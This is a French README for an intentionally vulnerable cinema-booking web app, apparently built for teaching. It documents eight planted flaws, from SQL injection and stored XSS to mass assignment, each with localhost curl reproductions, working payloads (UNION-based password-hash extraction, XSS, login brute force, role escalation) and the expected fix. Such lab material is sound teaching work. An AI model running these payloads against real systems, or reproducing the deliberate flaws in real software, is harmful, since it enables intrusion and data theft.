# Vulnérabilités — Version `vulnerable`

> **Avertissement** : ces vulnérabilités sont intentionnelles, à usage local uniquement, dans le cadre d'un projet pédagogique. Ne jamais déployer cette version en production.

Chaque vulnérabilité est volontaire, exploitable localement, documentée, non destructive et compréhensible pour un rapport.

---

## 1. IDOR / BOLA (Broken Access Control)

### Description
Un utilisateur authentifié peut accéder aux réservations d'autres utilisateurs en modifiant l'identifiant dans l'URL ou l'API.

### Endpoint
`GET /api/reservations/:id`

### Fichiers
- `backend/src/routes/reservations.js`

### Reproduction
```bash
# Connexion en tant qu'utilisateur standard
TOKEN=$(curl -s -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@demo.local","password":"password"}' | jq -r .token)

# Accès à la réservation d'un autre utilisateur (remplacer :id par un ID existant, ex. 4)
curl -s http://localhost:3001/api/reservations/4 \
  -H "Authorization: Bearer $TOKEN" | jq
```

### Impact
Fuite de données personnelles (email, places réservées, montant).

### Correction attendue (branche `secure`)
Vérifier que `reservation.user_id === req.user.id` (ou rôle admin) avant de retourner les données.

---

## 2. BOLA — Panneau admin sans contrôle de rôle

### Description
L'endpoint `/api/admin/stats` est accessible à tout utilisateur authentifié, pas seulement aux admins.

### Endpoint
`GET /api/admin/stats`

### Fichiers
- `backend/src/routes/admin.js`

### Reproduction
```bash
curl -s http://localhost:3001/api/admin/stats \
  -H "Authorization: Bearer $TOKEN" | jq
```

### Impact
Un utilisateur standard accède aux statistiques et réservations de tous les clients.

### Correction attendue
Appliquer le middleware `adminRequired`.

---

## 3. Injection SQL

### Description
La recherche de films concatène directement le paramètre `q` dans la requête SQL.

### Endpoint
`GET /api/movies/search?q=`

### Fichiers
- `backend/src/routes/movies.js`

### Reproduction
```bash
# Extraction des emails et hash de mots de passe (UNION-based)
curl -s "http://localhost:3001/api/movies/search?q=%27%20UNION%20SELECT%20id,email,password,role,bio%20FROM%20users--" | jq

# Liste des tables SQLite
curl -s "http://localhost:3001/api/movies/search?q=%27%20UNION%20SELECT%201,name,sql,1,1%20FROM%20sqlite_master--" | jq
```

### Impact
Lecture non autorisée de la base de données (emails, mots de passe hashés, structure).

### Correction attendue
Requêtes paramétrées (`db.prepare('... WHERE title LIKE ?').all('%' + q + '%')`).

---

## 4. XSS — Réfléchi (login)

### Description
Le message d'erreur de connexion inclut l'email saisi sans échappement. Le frontend l'affiche via `dangerouslySetInnerHTML`.

### Endpoints / Pages
- `POST /api/auth/login`
- `frontend/app/login/page.tsx`

### Reproduction
1. Aller sur http://localhost:3000/login
2. Saisir comme email : `<img src=x onerror=alert('XSS')>@test.com`
3. Entrer un mot de passe quelconque et soumettre
4. Une alerte JavaScript s'affiche

### Impact
Exécution de script arbitraire dans le navigateur de la victime.

### Correction attendue
Échapper le HTML côté serveur et client ; ne jamais utiliser `dangerouslySetInnerHTML` pour du contenu utilisateur.

---

## 5. XSS — Stocké (avis films)

### Description
Les avis sur les films sont stockés et rendus sans sanitisation via `dangerouslySetInnerHTML`.

### Endpoints / Pages
- `POST /api/reviews`
- `frontend/app/movies/[id]/page.tsx`

### Reproduction
1. Se connecter
2. Aller sur la fiche d'un film
3. Publier un avis : `<script>alert('XSS stocké')</script>`
4. Recharger la page — le script s'exécute pour tous les visiteurs

### Impact
Vol de session, redirection, defacement.

### Correction attendue
Sanitiser à l'affichage (DOMPurify) ou échapper le HTML.

---

## 6. Authentification faible

### Description
- Secret JWT hardcodé (`cinema-secret-key`)
- Expiration longue (30 jours)
- Pas de rate limiting sur `/api/auth/login`
- Cost bcrypt faible (4 rounds)
- Endpoint debug expose le secret JWT

### Fichiers
- `backend/src/middleware/auth.js`
- `backend/src/routes/auth.js`
- `backend/src/routes/debug.js`

### Reproduction
```bash
# Brute force possible (pas de limite)
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:3001/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@demo.local","password":"wrong'$i'"}'
done

# Récupération du secret JWT
curl -s http://localhost:3001/api/debug/config | jq .jwt_secret
```

### Impact
Forge de tokens JWT, brute force de mots de passe.

### Correction attendée
Secret fort en variable d'environnement, expiration courte, rate limiting, bcrypt cost ≥ 10, supprimer l'endpoint debug.

---

## 7. Mass Assignment

### Description
Les endpoints acceptent des champs sensibles non filtrés depuis le body de la requête.

### Endpoints
- `PATCH /api/users/me` — accepte `role`
- `POST /api/reservations` — accepte `total_price`, `status`, `user_id`

### Fichiers
- `backend/src/routes/users.js`
- `backend/src/routes/reservations.js`

### Reproduction — Élévation de privilège
```bash
curl -s -X PATCH http://localhost:3001/api/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' | jq
```

### Reproduction — Réservation gratuite
```bash
curl -s -X POST http://localhost:3001/api/reservations \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "showtime_id": 2,
    "seats": [{"seat_id": 10, "ticket_type": "adulte"}],
    "total_price": 0
  }' | jq
```

### Impact
Élévation de privilège, fraude sur les prix.

### Correction attendue
Whitelist des champs modifiables ; calculer `total_price` côté serveur uniquement.

---

## 8. Misconfiguration / Information Disclosure

### Description
- `NODE_ENV=development` par défaut
- Stack traces exposées dans les réponses 500
- CORS ouvert (`*`)
- Headers de sécurité absents
- `/api/debug/config` expose secrets et chemins
- `GET /api/users/:id` retourne le hash du mot de passe

### Fichiers
- `backend/src/index.js`
- `backend/src/routes/debug.js`
- `backend/src/routes/users.js`
- `backend/src/routes/movies.js` (erreur SQLi avec stack)

### Reproduction
```bash
curl -s http://localhost:3001/api/debug/config | jq
curl -s http://localhost:3001/api/health | jq

# Fuite du hash mot de passe
curl -s http://localhost:3001/api/users/1 \
  -H "Authorization: Bearer $TOKEN" | jq
```

### Impact
Facilite toutes les autres attaques ; fuite de secrets et structure interne.

### Correction attendue
Désactiver le mode debug en production, handler d'erreurs générique, headers CSP/HSTS/X-Frame-Options, supprimer les endpoints de debug.
